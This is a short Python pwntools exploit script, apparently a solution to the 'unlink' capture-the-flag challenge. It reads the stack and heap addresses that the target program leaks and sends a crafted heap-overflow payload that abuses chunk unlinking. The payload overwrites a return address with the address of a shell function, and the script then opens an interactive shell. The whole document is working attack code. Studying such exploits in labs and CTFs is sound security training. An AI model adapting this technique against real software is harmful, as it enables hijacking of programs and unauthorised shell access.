import re
from pwn import *
from struct import pack

p = process("./unlink")

stack_leak = int(re.search('0x[^\n]+', p.recvline()).group(0),16)
print(hex(stack_leak))
heap_leak = int(re.search('0x[^\n]+', p.recvline()).group(0),16)
print(hex(heap_leak))
ret = stack_leak + 16
shell = 0x80484eb
heap = heap_leak + 8
p.sendline(pack('<I', shell) + "A" * 12 + pack('<I', ret - 4) + pack('<I', heap + 4))
p.interactive()

